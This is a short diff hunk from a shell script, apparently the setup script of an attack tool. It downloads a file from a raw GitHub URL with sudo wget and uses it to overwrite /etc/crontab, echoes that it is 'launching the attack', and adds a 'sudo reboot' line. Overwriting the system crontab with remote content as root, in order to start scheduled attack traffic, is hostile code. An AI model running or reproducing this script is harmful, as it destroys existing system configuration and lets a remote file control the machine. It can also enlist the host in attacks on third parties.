@@ -9,3 +9,5 @@ sudo wget -O /etc/crontab https://raw.githubusercontent.com/russskiykorablidinah
 echo "Done preparing crontab file"
 
 echo "Rebooting the system and launching the attack"
+
+sudo reboot
